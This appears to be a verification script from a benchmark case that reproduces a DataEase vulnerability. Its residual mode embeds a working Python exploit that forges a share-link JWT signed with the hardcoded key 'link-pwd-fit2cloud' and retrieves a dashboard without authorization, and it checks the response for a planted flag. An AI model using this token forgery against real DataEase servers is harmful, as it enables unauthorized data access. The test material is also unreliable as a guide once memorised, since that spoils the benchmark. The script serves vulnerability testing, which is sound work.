#!/usr/bin/env bash
# verify.sh --seed|--residual
# 0=flag in HTTP body  10=blocked/no flag  20=env  30=args
#
# Effect channel = real DataEase POST /de2api/dataVisualization/findById body.
# Flag is the planted dashboard name (start.sh). Judge uses RUN_FLAG so
# wrong/stale overrides cannot match the planted token.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

PORT=""
for _ in $(seq 1 30); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
    port "dataease_${VERSION}" 8100 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -n "$PORT" ]]; then
    code="$(curl -s -o /dev/null -w '%{http_code}' --max-time 3 \
      "http://127.0.0.1:${PORT}/de2api/login/localLogin" || true)"
    if [[ -n "$code" && "$code" != "000" ]]; then
      break
    fi
  fi
  sleep 2
  PORT=""
done
[[ -n "$PORT" ]] || { echo "verify: no published dataease_${VERSION}:8100" >&2; exit 20; }
export PCB_TARGET_PORT="$PORT"

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$RUN_FLAG")" || { echo "verify: original_poc failed" >&2; exit 20; }
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # residual (CVE-2026-57172): ShareLink still signs with hardcoded
  # 'link-pwd-fit2cloud' on v1=2.10.23. Forge X-DE-LINK-TOKEN and POST findById.
  OUT="$("$PY" - "$PCB_TARGET_PORT" <<'PYEOF'
import base64, hashlib, hmac, json, sys, time, urllib.error, urllib.request
port = sys.argv[1]
if not port:
    print(json.dumps({"error": "no PCB_TARGET_PORT", "status": 0, "body": ""}))
    sys.exit(1)
RESOURCE_ID = 777000777
KEY = "link-pwd-fit2cloud"

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")

header = {"typ": "JWT", "alg": "HS256"}
claims = {"uid": 1, "resourceId": RESOURCE_ID, "oid": 1, "exp": int(time.time()) + 86400}
seg = b64url(json.dumps(header, separators=(",", ":")).encode()) + "." + \
      b64url(json.dumps(claims, separators=(",", ":")).encode())
tok = seg + "." + b64url(hmac.new(KEY.encode(), seg.encode(), hashlib.sha256).digest())
body = json.dumps({"id": RESOURCE_ID, "busiFlag": "dashboard"}).encode()
req = urllib.request.Request(f"http://127.0.0.1:{port}/de2api/dataVisualization/findById",
                             data=body, method="POST")
req.add_header("Content-Type", "application/json")
req.add_header("X-DE-LINK-TOKEN", tok)
try:
    with urllib.request.urlopen(req, timeout=30) as r:
        text = r.read().decode("utf-8", "replace")
        status = r.status
except urllib.error.HTTPError as e:
    text = e.read().decode("utf-8", "replace")
    status = e.code
except Exception as e:
    print(json.dumps({"error": f"transport: {e!r}", "status": 0, "body": ""}))
    sys.exit(1)
print(json.dumps({"status": status, "body": text}))
PYEOF
)" || { echo "$OUT" >&2; exit 20; }
fi

BODY="$("$PY" -c "
import json,sys
raw=sys.stdin.read()
try:
    d=json.loads(raw)
except Exception:
    print('')
    sys.exit(0)
if d.get('error') and not d.get('body'):
    sys.stderr.write('verify: probe error: %s\n' % d.get('error','')[:300])
    sys.exit(20)
print(d.get('body') or '')
" <<<"$OUT")" || { echo "$OUT" >&2; exit 20; }

echo "mode=${MODE#--} port=${PORT} body=${BODY:0:400}"
if [[ -n "$RUN_FLAG" && "$BODY" == *"$RUN_FLAG"* ]]; then
  exit 0
fi
exit 10
